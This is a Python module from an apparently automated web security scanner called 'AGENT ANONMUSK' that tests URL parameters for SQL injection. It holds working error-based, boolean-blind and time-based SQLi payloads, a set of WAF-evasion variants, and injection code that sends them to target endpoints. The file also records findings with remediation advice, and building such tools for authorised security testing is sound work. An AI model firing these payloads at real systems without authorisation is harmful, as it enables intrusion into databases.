"""
AGENT ANONMUSK — SQLi Engine
============================
SQL injection detection: error-based, boolean-blind, and time-based blind.
"""

from __future__ import annotations

import logging
import re
import time

from core.context import Evidence, Finding, Severity, VulnType
from modules.base import BaseModule
from utils.http_client import HTTPClient

logger = logging.getLogger("AGENT ANONMUSK.injection.sqli")

# ── Database Error Signatures ────────────────────────────────

DB_ERROR_PATTERNS = {
    "mysql": [
        re.compile(r"you have an error in your sql syntax", re.I),
        re.compile(r"warning.*mysql", re.I),
        re.compile(r"unclosed quotation mark", re.I),
        re.compile(r"mysql_fetch", re.I),
        re.compile(r"mysqli?[._]", re.I),
    ],
    "postgresql": [
        re.compile(r"pg_query\(\)", re.I),
        re.compile(r"pg_exec\(\)", re.I),
        re.compile(r"postgresql.*error", re.I),
        re.compile(r"unterminated quoted string", re.I),
        re.compile(r"syntax error at or near", re.I),
    ],
    "mssql": [
        re.compile(r"microsoft.*odbc.*sql", re.I),
        re.compile(r"\bsqlserver\b", re.I),
        re.compile(r"unclosed quotation mark after the character string", re.I),
        re.compile(r"mssql_query\(\)", re.I),
        re.compile(r"microsoft sql native client error", re.I),
    ],
    "sqlite": [
        re.compile(r"sqlite3?\.OperationalError", re.I),
        re.compile(r"sqlite.*error", re.I),
        re.compile(r"unrecognized token", re.I),
    ],
    "oracle": [
        re.compile(r"ora-\d{5}", re.I),
        re.compile(r"oracle.*error", re.I),
        re.compile(r"oracle.*driver", re.I),
    ],
    "generic": [
        re.compile(r"sql syntax.*error", re.I),
        re.compile(r"sql.*error", re.I),
        re.compile(r"database error", re.I),
        re.compile(r"query failed", re.I),
    ],
}

# ── Error-Based Payloads ─────────────────────────────────────
ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "1' AND '1'='1",
    "' UNION SELECT NULL--",
    "') OR ('1'='1",
    "1; SELECT 1--",
]

# WAF-Evasion SQLi payloads
WAF_EVASION_SQLI = [
    "' /*!OR*/ '1'='1",
    "'/**/OR/**/1=1--",
    "' oR '1'='1",
    "'+OR+'1'='1",
    "'%20OR%20'1'='1",
    "' OR 0x31=0x31--",
    "' /*!50000OR*/ 1=1--",
    "'||'1'='1",
]

# Boolean Blind payloads
BOOLEAN_TRUE = "' OR 1=1--"
BOOLEAN_FALSE = "' OR 1=2--"

# Time-Based Blind payloads (per DBMS)
TIME_PAYLOADS = {
    "mysql": "' OR SLEEP({delay})--",
    "postgresql": "'; SELECT pg_sleep({delay})--",
    "mssql": "'; WAITFOR DELAY '0:0:{delay}'--",
    "sqlite": "' OR 1=randomblob(100000000)--",
    "generic": "' OR SLEEP({delay})--",
}


class SQLiEngine(BaseModule):
    """
    SQL Injection detection engine.

    Methods:
    1. Error-based: Trigger SQL errors with special characters
    2. Boolean-blind: Compare true vs false condition response lengths
    3. Time-based blind: Measure response time with SLEEP/pg_sleep
    """

    MODULE_NAME = "sqli"

    async def run(self) -> None:
        self._log_start("Testing for SQL injection...")

        target_urls = self._attack_params.get("target_urls", [])
        params_to_test = self._attack_params.get("parameters", [])

        if not target_urls:
            target_urls = [
                ep.url for ep in self.ctx.endpoints
                if ep.interesting and ep.params
            ]

        if not target_urls:
            self._log_complete("No endpoints with parameters to test")
            return

        waf_evasion = self.config.get("attack", {}).get("waf_evasion", True)
        blind_delay = self.config.get("attack", {}).get("blind_injection_delay", 5)
        scan_config = self.config.get("scanning", {})

        async with HTTPClient(
            scope=self.scope,
            rate_limit=scan_config.get("rate_limit", 5),
            timeout=max(scan_config.get("request_timeout", 15), blind_delay + 10),
        ) as client:
            for url in target_urls[:20]:
                await self._test_endpoint(
                    client, url, params_to_test, waf_evasion, blind_delay
                )

        self._log_complete("SQLi testing complete")

    async def _test_endpoint(
        self,
        client: HTTPClient,
        url: str,
        params_filter: list[str],
        waf_evasion: bool,
        blind_delay: int,
    ):
        """Test a single endpoint for SQLi."""
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return

        for param_name in params:
            if params_filter and param_name not in params_filter:
                continue

            # Try error-based first (fastest)
            if await self._test_error_based(client, url, param_name, waf_evasion):
                continue  # Found, move to next param

            # Try boolean blind
            if await self._test_boolean_blind(client, url, param_name):
                continue

            # Try time-based blind (slowest, last resort)
            await self._test_time_blind(client, url, param_name, blind_delay)

    async def _test_error_based(
        self, client: HTTPClient, url: str, param: str, waf_evasion: bool
    ) -> bool:
        """Test for error-based SQL injection."""
        payloads = list(ERROR_PAYLOADS)
        if waf_evasion:
            payloads.extend(WAF_EVASION_SQLI)

        for payload in payloads:
            test_url = self._inject_param(url, param, payload)
            try:
                resp, evidence = await client.get(test_url)
                db_type = self._detect_db_error(resp.text)

                if db_type:
                    finding = Finding(
                        title=f"SQL Injection (Error-Based) in '{param}' at {url}",
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        description=(
                            f"Error-based SQL injection detected. The parameter "
                            f"'{param}' triggers database errors when injected "
                            f"with SQL syntax.\n\n"
                            f"Database: {db_type}\n"
                            f"Payload: {payload}"
                        ),
                        evidence=[evidence],
                        confidence=0.95,
                        target_url=url,
                        parameter=param,
                        payload=payload,
                        remediation=(
                            "1. Use parameterized/prepared statements\n"
                            "2. Use ORM queries instead of raw SQL\n"
                            "3. Implement input validation (whitelist approach)\n"
                            "4. Apply least-privilege DB permissions"
                        ),
                    )
                    self.ctx.add_finding(finding)
                    logger.warning(
                        "💉 SQLi (error-based) found: %s [%s]", url, db_type
                    )
                    return True

            except Exception as e:
                logger.debug("SQLi error test failed: %s", e)

        return False

    async def _test_boolean_blind(
        self, client: HTTPClient, url: str, param: str
    ) -> bool:
        """Test for boolean-blind SQL injection."""
        try:
            # Get baseline
            baseline_url = self._inject_param(url, param, "1")
            baseline_resp, _ = await client.get(baseline_url)
            baseline_len = len(baseline_resp.text)

            # True condition
            true_url = self._inject_param(url, param, BOOLEAN_TRUE)
            true_resp, true_evidence = await client.get(true_url)
            true_len = len(true_resp.text)

            # False condition
            false_url = self._inject_param(url, param, BOOLEAN_FALSE)
            false_resp, _ = await client.get(false_url)
            false_len = len(false_resp.text)

            # If true and false give consistently different lengths
            if (
                abs(true_len - false_len) > 50
                and true_resp.status_code == 200
                and false_resp.status_code == 200
            ):
                finding = Finding(
                    title=f"SQL Injection (Boolean Blind) in '{param}' at {url}",
                    vuln_type=VulnType.SQLI,
                    severity=Severity.HIGH,
                    description=(
                        f"Boolean-blind SQL injection detected. True and false "
                        f"SQL conditions produce different response lengths.\n\n"
                        f"True payload ({true_len} bytes): {BOOLEAN_TRUE}\n"
                        f"False payload ({false_len} bytes): {BOOLEAN_FALSE}"
                    ),
                    evidence=[true_evidence],
                    confidence=0.75,
                    target_url=url,
                    parameter=param,
                    payload=BOOLEAN_TRUE,
                    remediation=(
                        "Use parameterized queries. The application builds SQL "
                        "queries by concatenating user input directly."
                    ),
                )
                self.ctx.add_finding(finding)
                logger.warning("💉 SQLi (boolean blind) found: %s", url)
                return True

        except Exception as e:
            logger.debug("Boolean blind test failed: %s", e)

        return False

    async def _test_time_blind(
        self, client: HTTPClient, url: str, param: str, delay: int
    ) -> bool:
        """Test for time-based blind SQL injection."""
        for db_type, payload_template in TIME_PAYLOADS.items():
            payload = payload_template.format(delay=delay)
            test_url = self._inject_param(url, param, payload)

            try:
                start = time.monotonic()
                resp, evidence = await client.get(test_url)
                elapsed = time.monotonic() - start

                if elapsed >= delay * 0.8:  # 80% of expected delay
                    finding = Finding(
                        title=f"SQL Injection (Time-Based Blind) in '{param}' at {url}",
                        vuln_type=VulnType.SQLI,
                        severity=Severity.HIGH,
                        description=(
                            f"Time-based blind SQL injection detected. The "
                            f"server delayed {elapsed:.1f}s (expected {delay}s).\n\n"
                            f"Database (likely): {db_type}\n"
                            f"Payload: {payload}"
                        ),
                        evidence=[evidence],
                        confidence=0.7,
                        target_url=url,
                        parameter=param,
                        payload=payload,
                        remediation="Use parameterized/prepared statements for all DB queries.",
                    )
                    self.ctx.add_finding(finding)
                    logger.warning(
                        "💉 SQLi (time-blind) found: %s [%s, %.1fs]",
                        url, db_type, elapsed,
                    )
                    return True

            except Exception as e:
                logger.debug("Time blind test failed: %s", e)

        return False

    @staticmethod
    def _detect_db_error(body: str) -> str:
        """Check if response body contains database error messages."""
        for db_type, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern.search(body):
                    return db_type
        return ""

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        """Replace a parameter value in a URL."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        flat_params = {k: v[0] for k, v in params.items()}
        new_query = urlencode(flat_params, quote_via=quote)
        return urlunparse(parsed._replace(query=new_query))
